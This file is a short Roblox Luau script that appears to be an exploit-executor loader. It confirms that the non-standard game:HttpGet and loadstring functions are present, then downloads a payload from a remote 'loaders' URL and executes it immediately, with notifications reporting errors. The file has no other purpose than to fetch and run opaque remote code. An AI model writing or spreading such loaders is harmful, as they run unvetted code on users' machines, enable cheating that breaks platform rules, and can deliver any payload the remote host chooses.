local StarterGui: StarterGui = game:GetService("StarterGui")

local function Notify(title: string, text: string, duration: number?): boolean
 local data = {
  Title = title,
  Text = text,
  Duration = duration or 5,
 }

 for _ = 1, 20 do
  local s = pcall(StarterGui.SetCore, StarterGui, "SendNotification", data)
  if s then
   return true
  end
  task.wait(0.25)
 end

 return false
end

local function Main(): ()
 if type(game.HttpGet) ~= "function" then
  Notify("env error", "game:HttpGet is missing")
  return
 end

 if type(loadstring) ~= "function" then
  Notify("env error", "loadstring is missing")
  return
 end

 local k, e = pcall(function()
  loadstring(game:HttpGet("https://api.jnkie.com/api/v1/loaders/public/700dc87c48f4bd6c2a974111b6f3c6d4a984d31f27ef31ab995a6eeff3dc570a/download"))()
 end)

 if not k then
  Notify("unknown error", tostring(e))
 end
end

Main()
